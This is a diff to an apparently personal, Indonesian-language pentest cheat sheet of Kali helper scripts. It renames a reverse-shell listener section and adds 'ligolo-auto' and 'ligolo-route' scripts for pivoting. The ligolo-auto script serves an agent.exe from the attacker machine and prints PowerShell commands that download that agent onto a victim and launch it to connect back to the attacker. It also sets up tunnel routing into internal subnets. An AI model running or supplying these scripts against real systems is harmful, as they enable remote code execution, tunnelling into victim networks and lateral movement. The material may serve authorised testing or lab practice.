@@ -343,14 +343,14 @@ webdav /home/kali/share 8080 (Custom folder + port)
 ---
 
 
-## 4. Reverse shell
+## 5. Reverse shell
 
 **Deskripsi:** Shortcut cepat untuk running nc -lnvp + session log + rlwrap (wsgidav)
 
 ### Setup
 ```bash
-sudo nano /usr/local/bin/webdav
-sudo chmod +x /usr/local/bin/webdav
+sudo nano /usr/local/bin/revshell
+sudo chmod +x /usr/local/bin/revshell
 ```
 
 ### Script
@@ -378,4 +378,113 @@ rev 9001
 
 ---
 
+## 6. Ligolo-auto
 
+**Deskripsi:** Shortcut cepat untuk running ligolo + create tun interface untuk pivoting + running webserver di folder yang telah ditentukan.
+
+### Setup
+```bash
+sudo nano /usr/local/bin/ligolo-auto
+sudo chmod +x /usr/local/bin/ligolo-auto
+```
+
+### Script
+```bash
+#!/bin/bash
+
+LIGOLO_DIR="/opt/postexploitation/ligolo"
+PORT=11601
+WEBPORT=8000
+IFACE="ligolo"
+
+# =========================
+# DETECT IP
+# =========================
+IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
+[ -z "$IP" ] && IP=$(hostname -I | awk '{print $1}')
+
+echo "[+] Attacker IP : $IP"
+echo ""
+
+# =========================
+# SETUP TUN (AUTO)
+# =========================
+echo "[+] Preparing TUN interface..."
+
+if ip link show $IFACE >/dev/null 2>&1; then
+    echo "[*] TUN already exists, reusing..."
+else
+    sudo ip tuntap add user $(whoami) mode tun $IFACE
+    sudo ip link set $IFACE up
+    echo "[+] TUN created: $IFACE"
+fi
+
+echo ""
+
+# =========================
+# START WEBSERVER
+# =========================
+if [ -f "$LIGOLO_DIR/agent.exe" ]; then
+    echo "[+] Starting webserver on :$WEBPORT"
+    (cd "$LIGOLO_DIR" && python3 -m http.server $WEBPORT >/dev/null 2>&1 &)
+else
+    echo "[!] agent.exe not found!"
+fi
+
+# =========================
+# TARGET COMMAND
+# =========================
+CMD1="iwr http://$IP:$WEBPORT/agent.exe -OutFile agent.exe"
+CMD2="Start-Process .\\agent.exe -ArgumentList '-connect $IP:$PORT -ignore-cert'"
+
+echo "[+] Run on target:"
+echo "--------------------------------"
+echo "$CMD1"
+echo "$CMD2"
+echo "--------------------------------"
+
+# =========================
+# START PROXY
+# =========================
+echo ""
+echo "[*] Starting Ligolo..."
+cd "$LIGOLO_DIR" || exit
+./proxy -selfcert
+                 
+```
+
+### Usage
+```bash
+ligolo-auto
+```
+
+## 7. Ligolo-route
+
+**Deskripsi:** Shortcut cepat untuk nambah routing untuk pivoting menggunakan ligolo.
+
+### Setup
+```bash
+sudo nano /usr/local/bin/ligolo-route
+sudo chmod +x /usr/local/bin/ligolo-route
+```
+
+### Script
+```bash
+#!/bin/bash
+
+IFACE="ligolo"
+
+if [ -z "$1" ]; then
+    echo "Usage: ligolo-route <subnet>"
+    exit 1
+fi
+
+echo "[+] Adding route $1 via $IFACE"
+sudo ip route add $1 dev $IFACE
+                 
+```
+
+### Usage
+```bash
+ligolo-route 172.16.6.0/24
+```
